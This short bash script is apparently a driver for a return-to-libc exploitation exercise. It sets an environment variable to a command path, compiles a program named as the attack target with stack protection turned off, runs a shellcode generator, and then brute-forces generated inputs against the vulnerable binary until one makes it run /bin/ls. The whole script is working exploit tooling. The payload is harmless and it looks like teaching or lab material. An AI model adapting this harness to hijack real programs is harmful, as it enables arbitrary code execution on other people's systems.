#!/bin/bash

var_name="env_var"

#export $var_name="/usr/games/mahjongg"
export $var_name="/bin/ls"

gcc -fno-stack-protector Return_to_lib_attack.c -o exploitable 2> /dev/null

gcc rtla_shellcode_generator.c -o create_shellcode
./create_shellcode $var_name

COUNTER=0

while read LINE 
do
	OUT=$(./exploitable "$LINE" 2> /dev/null)
	[[ $OUT =~ " "  && $COUNTER -eq 0 ]] && echo $OUT && ((COUNTER++)) 
done < code
